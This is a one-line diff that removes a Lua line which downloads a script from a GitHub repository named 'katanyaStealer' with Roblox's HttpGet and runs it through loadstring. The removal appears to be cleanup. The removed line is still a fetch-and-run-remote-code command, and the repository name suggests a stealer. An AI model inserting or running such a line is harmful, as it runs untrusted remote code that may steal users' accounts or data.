@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/aldyjrz/katanyaStealer/refs/heads/main/main_new.lua"))()
